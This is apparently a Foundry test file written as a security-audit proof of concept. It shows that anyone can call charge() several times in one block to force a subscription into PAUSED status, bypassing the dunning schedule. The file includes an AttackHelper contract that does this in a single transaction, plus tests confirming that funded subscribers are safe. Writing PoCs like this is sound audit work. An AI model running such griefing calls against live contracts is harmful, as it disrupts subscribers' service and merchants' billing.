// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {SubscriptionManager} from "../src/SubscriptionManager.sol";
import {FeeRouter} from "../src/FeeRouter.sol";
import {MockUSDC} from "./mocks/MockUSDC.sol";
import {MockPermit2} from "./mocks/MockPermit2.sol";

/// @title PermissionlessFailureTest
/// @notice Demonstrates that anyone can force a subscription to auto-pause
///         by calling charge() repeatedly in a single block when the pull fails.
///         This bypasses the off-chain 1/3/7-day dunning schedule entirely.
contract PermissionlessFailureTest is Test {
    MockUSDC usdc;
    FeeRouter router;
    SubscriptionManager manager;
    MockPermit2 permit2;

    address merchant = makeAddr("merchant");
    address subscriber = makeAddr("subscriber");
    address attacker = makeAddr("attacker");
    address treasury = makeAddr("treasury");

    uint256 constant PRICE = 10_000_000; // $10.00
    uint256 constant CYCLE = 1 days;

    function setUp() public {
        usdc = new MockUSDC();
        router = new FeeRouter(address(usdc), treasury);
        permit2 = new MockPermit2();
        manager = new SubscriptionManager(address(usdc), address(router), address(permit2));

        // Fund subscriber with enough for subscribe + a few charges
        usdc.mint(subscriber, PRICE * 5);
    }

    /// @notice Demonstrates the core vulnerability: anyone can call charge()
    ///         2*maxFailed times in a single block to auto-pause a subscription
    ///         the moment its pull would fail, bypassing the dunning schedule.
    function testPermissionlessFailureAttack() public {
        // Merchant creates a plan with maxFailed=2 (auto-pause at 4 failures)
        vm.prank(merchant);
        uint256 planId = manager.createPlan(PRICE, CYCLE, 0, 0, 2);

        // Subscriber approves exactly 2 cycles and subscribes
        // After subscribe (which bills cycle 1), they have 1 cycle of allowance left
        vm.startPrank(subscriber);
        usdc.approve(address(manager), PRICE * 2);
        uint256 subId = manager.subscribe(planId, bytes32(0));
        vm.stopPrank();

        // Verify: ACTIVE, 1 charge done, next charge in 1 day
        (, , , , , , uint256 chargeCount, SubscriptionManager.Status status) = manager.subscriptions(subId);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.ACTIVE));
        assertEq(chargeCount, 1);

        // Fast-forward to the next billing date
        (, , , uint64 nextChargeAt, , , , ) = manager.subscriptions(subId);
        vm.warp(nextChargeAt);

        // Subscriber's second charge succeeds (they have allowance for 1 more)
        manager.charge(subId);
        (, , , , , , chargeCount, status) = manager.subscriptions(subId);
        assertEq(chargeCount, 2);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.ACTIVE));

        // Fast-forward to the third billing date
        // Now subscriber has NO allowance left - pull will fail
        (, , , nextChargeAt, , , , ) = manager.subscriptions(subId);
        vm.warp(nextChargeAt);

        // === THE ATTACK ===
        // An attacker (or anyone) can now call charge() 4 times in one block
        // to push the subscription from ACTIVE -> PAST_DUE -> PAUSED
        // This bypasses the intended 1/3/7-day dunning retry schedule!

        vm.startPrank(attacker);
        
        // Call 1: fails, failedAttempts = 1
        manager.charge(subId);
        uint64 failed;
        (, , , , failed, , , status) = manager.subscriptions(subId);
        assertEq(failed, 1);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.ACTIVE));

        // Call 2: fails, failedAttempts = 2 -> PAST_DUE (>= maxFailed)
        manager.charge(subId);
        (, , , , failed, , , status) = manager.subscriptions(subId);
        assertEq(failed, 2);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.PAST_DUE));

        // Call 3: fails, failedAttempts = 3
        manager.charge(subId);
        (, , , , failed, , , status) = manager.subscriptions(subId);
        assertEq(failed, 3);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.PAST_DUE));

        // Call 4: fails, failedAttempts = 4 -> PAUSED (>= 2*maxFailed)
        manager.charge(subId);
        (, , , , failed, , , status) = manager.subscriptions(subId);
        assertEq(failed, 4);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.PAUSED));

        vm.stopPrank();

        // The subscription is now PAUSED in a SINGLE BLOCK
        // The off-chain 1/3/7-day dunning schedule was completely bypassed
        // The subscriber never had a chance to top up their allowance
    }

    /// @notice Shows the attack can be done in a single transaction via a helper
    function testPermissionlessFailureOneTransaction() public {
        // Setup: same as above
        vm.prank(merchant);
        uint256 planId = manager.createPlan(PRICE, CYCLE, 0, 0, 2);

        vm.startPrank(subscriber);
        usdc.approve(address(manager), PRICE); // Only enough for subscribe
        uint256 subId = manager.subscribe(planId, bytes32(0));
        vm.stopPrank();

        // Fast-forward to second billing - pull will fail
        (, , , uint64 nextChargeAt, , , , ) = manager.subscriptions(subId);
        vm.warp(nextChargeAt);

        // Deploy attack helper and execute in one tx
        AttackHelper helper = new AttackHelper(manager);
        helper.forceAutoPause(subId, 4); // 2*maxFailed = 4

        // Verify: subscription is now PAUSED
        uint64 failed;
        SubscriptionManager.Status status;
        (, , , , failed, , , status) = manager.subscriptions(subId);
        assertEq(failed, 4);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.PAUSED));
    }

    /// @notice Confirms that a fully-funded subscriber cannot be attacked
    ///         (the charge succeeds, nextChargeAt advances, further charges revert)
    function testFullyFundedSubscriberIsSafe() public {
        vm.prank(merchant);
        uint256 planId = manager.createPlan(PRICE, CYCLE, 0, 0, 2);

        // Subscriber approves plenty
        vm.startPrank(subscriber);
        usdc.approve(address(manager), PRICE * 10);
        uint256 subId = manager.subscribe(planId, bytes32(0));
        vm.stopPrank();

        (, , , uint64 nextChargeAt, , , , ) = manager.subscriptions(subId);
        vm.warp(nextChargeAt);

        // First charge succeeds
        vm.prank(attacker);
        manager.charge(subId);

        // Second charge in the same block reverts (not due yet)
        vm.prank(attacker);
        vm.expectRevert(SubscriptionManager.NotChargeable.selector);
        manager.charge(subId);
    }

    /// @notice Tests the 63/64 rule: can an attacker force the try/catch to fail
    ///         by providing insufficient gas, even for a funded subscriber?
    function testGasLimitedCallCannotForceFailure() public {
        vm.prank(merchant);
        uint256 planId = manager.createPlan(PRICE, CYCLE, 0, 0, 2);

        vm.startPrank(subscriber);
        usdc.approve(address(manager), PRICE * 10);
        uint256 subId = manager.subscribe(planId, bytes32(0));
        vm.stopPrank();

        (, , , uint64 nextChargeAt, , , , ) = manager.subscriptions(subId);
        vm.warp(nextChargeAt);

        // Try to call charge() with minimal gas
        // The 63/64 rule means external calls get at most 63/64 of remaining gas
        // If the outer call has very little gas, the inner transferFrom might fail
        // But Solidity's try/catch should catch this as an out-of-gas revert
        
        // First, let's measure how much gas charge() actually needs for a success
        uint256 gasBefore = gasleft();
        manager.charge(subId);
        uint256 gasUsed = gasBefore - gasleft();
        
        // Reset state for the test
        vm.warp(nextChargeAt + CYCLE);
        
        // Now try with barely enough gas - the call should either succeed
        // or revert entirely (not record a failure)
        uint256 minGas = gasUsed + 50000; // some buffer for the outer call setup
        
        // This should succeed - Solidity protects against OOG in try/catch
        // by ensuring the call has enough gas, or the entire transaction reverts
        (bool success,) = address(manager).call{gas: minGas}(
            abi.encodeCall(manager.charge, (subId))
        );
        
        // Either the charge succeeded (success=true) or the whole call reverted
        // It should NOT have recorded a failure for a funded subscriber
        uint64 failed;
        uint256 charges;
        (, , , , failed, , charges, ) = manager.subscriptions(subId);
        
        if (success) {
            // Charge succeeded as expected
            assertEq(charges, 3); // subscribe + 2 charges
            assertEq(failed, 0);
        } else {
            // The low-gas call reverted entirely (acceptable)
            // Crucially, no failure was recorded
            assertEq(charges, 2); // unchanged from the first charge
            assertEq(failed, 0);
        }
    }
}

/// @notice Helper contract to demonstrate the attack in a single transaction
contract AttackHelper {
    SubscriptionManager immutable manager;

    constructor(SubscriptionManager _manager) {
        manager = _manager;
    }

    function forceAutoPause(uint256 subId, uint256 times) external {
        for (uint256 i = 0; i < times; i++) {
            manager.charge(subId);
        }
    }
}
